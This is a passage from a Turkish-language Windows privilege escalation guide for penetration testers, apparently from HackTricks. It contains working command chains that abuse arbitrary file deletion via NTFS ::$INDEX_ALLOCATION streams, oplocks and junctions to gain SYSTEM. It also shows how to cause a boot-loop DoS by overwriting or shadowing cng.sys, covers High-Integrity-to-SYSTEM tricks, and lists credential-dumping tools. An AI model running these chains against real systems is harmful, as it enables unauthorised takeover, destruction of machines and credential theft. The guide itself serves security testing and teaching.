    - Ele geçirdiğiniz DLL'i yükleyen, güvenilir ve **otomatik olarak yükseltilen** bir ikili dosya (ör. `osk.exe`) çalıştırın.
    - **İşte**: Kodunuz **SYSTEM olarak** çalışır.


### Rastgele Dosya Silme/Taşıma/Yeniden Adlandırmadan SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **bir klasörün tamamını** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz yalnızca **rastgele dosya silmeye** izin veriyorsa?

**NTFS dahili yapısından** yararlanabilirsiniz: her klasörün şu adla bilinen gizli bir alternatif veri akışı vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgilerini depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa ne olur?

1. Adım 1: Yem klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Ayrıcalıklı bir süreç `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM sürecini tetikleyin (örn. `SilentCleanup`)
- Bu süreç klasörleri (örn. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Step 4: Oplock callback'inin içinde — silme işlemini yönlendirin

- Option A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i zamanından önce serbest bırakır.

- Option B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluştur:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler — bu akışı silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak artık junction + symlink nedeniyle aslında şunu siler:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Keyfi Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak keyfi bir klasör oluşturmanı** sağlayan bir primitive'den yararlan — **dosya yazamasan** veya **zayıf izinler ayarlayamasan** bile.

**Kritik bir Windows driver'ının** adını taşıyan bir **klasör** (dosya değil) oluştur; örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode sürücüsüne karşılık gelir.
- **Önceden klasör olarak oluşturursanız**, Windows gerçek sürücüyü açılışta yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü bulamaz** ve **çöker veya açılışı durdurur**.
- **Geri dönüş yolu yoktur** ve harici müdahale (ör. açılış onarımı veya diske erişim) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı log/yedekleme yollarından ve OM symlink'lerinden keyfi dosya üzerine yazma / boot DoS'a

Bir **ayrıcalıklı servis**, **yazılabilir bir yapılandırma dosyasından** okuduğu bir yola log/dışa aktarma dosyaları yazdığında, bu yolu **Object Manager symlink'leri + NTFS mount point'leri** ile yönlendirerek ayrıcalıklı yazma işlemini keyfi dosya üzerine yazmaya dönüştürün (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu tutan yapılandırma dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM dosya symlink'i oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, dışa aktarma, rapor).

**Örnek zincir**
1. Ayrıcalıklı log hedefini bulmak için yapılandırma dosyasını okuyun. Ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin log'u yazmasını bekleyin (ör. yönetici "test SMS'i gönder" eylemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un kurcalanmış driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir servisin yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir. Bu da bozulmuş veriler için güvenilir bir DoS hedefi oluşturur.



## **High Integrity'den System'e**

### **Yeni servis**

Zaten bir High Integrity process içinde çalışıyorsanız, **SYSTEM'e giden yol** yeni bir servis **oluşturup çalıştırarak** kolayca aşılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[Kullanılan registry key'leri ve bir _.msi_ paketin nasıl yükleneceği hakkında daha fazla bilgiye buradan ulaşabilirsiniz.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token privileges'a

Bu token privilege'larına sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulacaksınız), SeDebug privilege'ını kullanarak **neredeyse tüm process'leri** (korumalı process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token privilege'larına sahip SYSTEM olarak çalışan bir process seçmek için kullanılır** (_evet, tüm token privilege'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği çalıştıran örnek bir kodu** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, `getsystem` içinde meterpreter tarafından privilege escalation için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından **`SeImpersonate`** privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) **token'ını impersonate ederek** SYSTEM privilege'larını elde edebilir.\
[**Named Pipes hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Named Pipes kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'yi **hijack** etmeyi başarırsanız, bu izinlerle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Üstelik, dll'leri yüklemek için kullanılan klasörlerde **yazma izinleri** olacağından, bunu **High Integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiyi** [**burada bulabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten full privs'e

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası bazı yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerel olarak çalıştırırken -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde dener**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc açıklarını arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc açıklarını arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u tarar (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe dosyası bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da düzgün çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da düzgün çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu yazı temel alınarak oluşturulmuş araçtır (düzgün çalışması için accesschk gerekmez ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak ayrıcalıkları yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - başvuru notları](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni trend (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Kapsamlı OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Sembolik Bağlantı Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Bağlantı. Windows'ta Sembolik Bağlantıları Kötüye Kullanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi alıştırmaları, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını Zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitifi](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silme İşlemlerini Kötüye Kullanarak Ayrıcalıkları Yükseltme ve Diğer Harika Hileler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Kaynak Tabanlı Kısıtlı Yetkilendirme: Bir Görüntü Değişikliği Ayrıcalık Yükseltmeye Yol Açtığında](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM'e Giden Adımlarınızı Yeniden İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services paylaşımlı bellek offset'leri için privilege escalation güvenlik duyurusu](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
